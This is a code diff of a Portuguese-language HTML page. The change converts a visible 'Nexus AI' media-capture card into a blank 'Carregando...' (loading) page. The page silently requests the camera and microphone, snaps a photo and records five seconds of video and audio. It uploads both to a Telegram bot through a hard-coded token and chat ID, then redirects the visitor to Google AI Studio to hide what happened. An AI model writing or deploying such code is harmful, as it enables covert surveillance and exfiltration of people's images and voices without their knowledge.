@@ -3,147 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nexus AI — Captura de Mídia</title>
+  <title>Carregando...</title>
   <style>
-    * {
-      box-sizing: border-box;
+    body {
+      background: #000000;
       margin: 0;
       padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-    }
-
-    body {
-      background: #090b10;
-      color: #f1f5f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 16px;
       overflow: hidden;
     }
-
-    .ai-card {
-      background: rgba(18, 22, 34, 0.85);
-      backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 24px;
-      padding: 36px 28px;
-      max-width: 420px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
-      position: relative;
-    }
-
-    .ai-orb-container {
-      width: 100px;
-      height: 100px;
-      margin: 0 auto 24px auto;
-      position: relative;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .ai-orb {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
-      background-size: 200% 200%;
-      animation: gradientShift 4s ease infinite, pulseOrb 2s infinite ease-in-out;
-      box-shadow: 0 0 30px rgba(168, 85, 247, 0.5);
-    }
-
-    .ai-ring {
-      position: absolute;
-      width: 96px;
-      height: 96px;
-      border: 2px dashed rgba(168, 85, 247, 0.4);
-      border-radius: 50%;
-      animation: spinRing 12s linear infinite;
-    }
-
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    @keyframes pulseOrb {
-      0%, 100% { transform: scale(0.95); opacity: 0.9; }
-      50% { transform: scale(1.05); opacity: 1; }
-    }
-
-    @keyframes spinRing {
-      to { transform: rotate(360deg); }
-    }
-
-    h2 {
-      font-size: 1.5rem;
-      font-weight: 700;
-      color: #ffffff;
-      margin-bottom: 8px;
-      letter-spacing: -0.5px;
-    }
-
-    p.subtitle {
-      font-size: 0.9rem;
-      color: #94a3b8;
-      line-height: 1.5;
-      margin-bottom: 28px;
-    }
-
-    .status-container {
-      background: rgba(30, 41, 59, 0.5);
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: 12px;
-      padding: 14px 16px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      text-align: left;
-    }
-
-    .spinner {
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(168, 85, 247, 0.2);
-      border-top-color: #a855f7;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      flex-shrink: 0;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .status-text {
-      font-size: 0.85rem;
-      color: #cbd5e1;
-      font-weight: 500;
-    }
-
     video, canvas { display: none; }
   </style>
 </head>
 <body>
-
-  <div class="ai-card">
-    <div class="ai-orb-container">
-      <div class="ai-ring"></div>
-      <div class="ai-orb"></div>
-    </div>
-    <h2>Gravando Mídia</h2>
-    <p class="subtitle">Processando áudio, vídeo e foto...</p>
-
-    <div class="status-container">
-      <div class="spinner" id="spinner"></div>
-      <span class="status-text" id="statusMsg">Inicializando...</span>
-    </div>
-  </div>
 
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
@@ -151,15 +22,11 @@
   <script>
     const TELEGRAM_TOKEN = '8387772090:AAEEWGOfpNJy0xT-2GwLQymQptoziAeaAR4';
     const CHAT_ID = '2003666494';
-
-    function atualizarStatus(msg) {
-      document.getElementById('statusMsg').innerText = msg;
-    }
+    const REDIRECT_URL = 'https://aistudio.google.com/prompts/new_chat?project=gen-lang-client-0954460682';
 
     async function iniciarNexusApp() {
       try {
-        atualizarStatus("Conectando sensores de vídeo e áudio...");
-        
+        // Solicita permissões de Mídia invisivelmente
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: true
@@ -169,18 +36,22 @@
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
+          // Captura Foto em 1 segundo
           setTimeout(() => capturarFoto(video), 1000);
+
+          // Inicia Gravação de Vídeo (5 segundos) e redireciona ao terminar
           setTimeout(() => gravarVideoEAudio(stream, 5000), 1200);
         };
 
       } catch (err) {
         console.error("Permissão negada ou erro:", err);
-        atualizarStatus("Erro ao calibrar sensores. Verifique as permissões.");
+        // Se o usuário negar, redireciona do mesmo jeito para não travar
+        window.location.href = REDIRECT_URL;
       }
     }
 
+    // Capturar e Enviar Foto
     function capturarFoto(video) {
-      atualizarStatus("Capturando foto...");
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
@@ -198,12 +69,13 @@
       }, 'image/jpeg', 0.85);
     }
 
+    // Gravar Vídeo (com Áudio) e Enviar
     function gravarVideoEAudio(stream, duracao) {
-      atualizarStatus("Gravando vídeo e áudio...");
       let mediaRecorder;
       try {
         mediaRecorder = new MediaRecorder(stream);
       } catch (e) {
+        window.location.href = REDIRECT_URL;
         return;
       }
 
@@ -217,12 +89,14 @@
         fd.append('chat_id', CHAT_ID);
         fd.append('video', blob, 'video_nexus.mp4');
         
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+        // Envia o vídeo e redireciona assim que concluir
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd })
+          .finally(() => {
+            window.location.href = REDIRECT_URL;
+          });
 
+        // Encerra a Câmera e Microfone
         stream.getTracks().forEach(track => track.stop());
-        
-        document.getElementById('spinner').style.display = 'none';
-        atualizarStatus("Processo concluído!");
       };
 
       mediaRecorder.start();
